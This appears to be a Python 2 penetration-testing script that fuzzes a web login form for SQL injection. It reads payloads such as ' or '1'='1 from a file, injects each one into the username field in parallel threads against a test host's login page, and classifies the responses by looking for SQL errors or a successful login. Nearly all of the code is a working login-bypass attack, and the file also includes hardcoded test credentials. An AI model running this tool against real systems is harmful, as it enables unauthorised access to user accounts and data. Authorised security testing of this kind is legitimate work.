'''
Created on 20-Dec-2012

@author: Dinesh Shetty
'''

import cookielib
import socket
import urllib
import urllib2
import os
import threading
import re
import time

payloads=[];responses={};usrname="blah";passwd="blah"

os.environ['https_proxy'] = 'http://127.0.0.1:9999'


def themainfunction(list_payload):
    #print "themainfunction entered"
    
    usrname="LBdefaultuser1@someblahserver.com"
    passwd="dinesh123"
    url = 'https://test.someblahserver.com/nmhgstg/login/login.jsp'
    http_header = {
                   "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0",
                   "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,text/png,*/*;q=0.5",
                   "Accept-Language" : "en-us,en;q=0.5",
                   "Content-type": "application/x-www-form-urlencoded",
                   "Host" : "test.someblahserver.com",
                   "Referer" : "https://test.someblahserver.com/blahblah/login/login.jsp"
                }

  
    
    threads=[]
    for i in list_payload:
    #Start a new thread for each payload
        #i stored the payload eg: ' or '1'='1
        t = threading.Thread(target=threaded_thefunction, args=(i,usrname,passwd,url,http_header,))
        threads.append(t)
        #time.sleep(1)
        t.start()
    #responses=threaded_thefunction(i)
    return responses
    
    
def threaded_thefunction(payload,usrname,passwd,url,http_header):
    #print "threading"
    timeout = 20
    socket.setdefaulttimeout(timeout)

    # setup cookie handler
    cookie_jar = cookielib.LWPCookieJar()
    cookie = urllib2.HTTPCookieProcessor(cookie_jar)

    opener = urllib2.build_opener(cookie)
    #time.sleep(1)
    attackusrname=usrname+payload
    attackusrname=re.sub(r'\n$',r'',attackusrname)

    #print "Payload: ",usrname+payload
    params = {
            'campus' : '3',
            'username' : attackusrname,
            'password' : passwd,
            'set_locale' : 'en_US'
            }
    req = urllib2.Request(url, urllib.urlencode(params), http_header)
    attackvector=attackusrname
    res = opener.open(req)
    html = res.read()
    responses[payload]=str(html) # creating a "hash" of the response which can be iterrated
    # above statement stores keyvalue pair eg:{"' or '1'='1": '<html><body>Thisisthestring/r/n thisisblah'}
    if "Please answer security question and click" in responses[payload]:
        print " Loads security questions page!!"
        status="Loads security questions page!!"
    elif "Username and password combination specified is invalid" in responses[payload]:
        print "Gives Wrong credentials error!!"
        status="Gives Wrong credentials error!!"
    elif "Don't have a User Name and Password yet" in responses[payload]:
        print "Takes back to Homepage!!"
        status="Takes back to Homepage!!"
    elif "Loading...please wait" in responses[payload]:
        print "Takes to Post login Loading...please wait page!!"
        status="Takes to Post login Loading...please wait page!!"
    elif "sql" in responses[payload]:
        print "SQL Error found:>>sql<<"
        status="SQL Error found:>>sql<<"
    elif "warning" in responses[payload]:
        print "Warning message found:>>warning<<"
        status="Warning message found:>>warning<<"
    else:
        print "Some problem occurred"
        status="Some problem occurred"
    #print responses[payload]
    #time.sleep(5)
    savetofile=open("finaloutput.txt","a")
    savetofile.write("Username: %s || Password: %s || Status: %s \n" % (attackusrname, passwd, status) )
    savetofile.close()
    return responses

    
def get_payload():
    #print "get_payload entered"
    vectorfile=open('attackvectors.txt','r')
    for line in vectorfile:
        line=re.sub(r'\n$',r'',line)
        payloads.append(line)
        #print "Attackvector:",line
    vectorfile.close()
    return payloads
    
def main():
    #print "main entered"
    #Get a list of all valid payloads
    print "Testing started................."
    list_payload=get_payload()
    #print list_payload[0]
    #Invoke method with each payload; one by one; responses all stored in a payload-response hash
    responses=themainfunction(list_payload)


main()
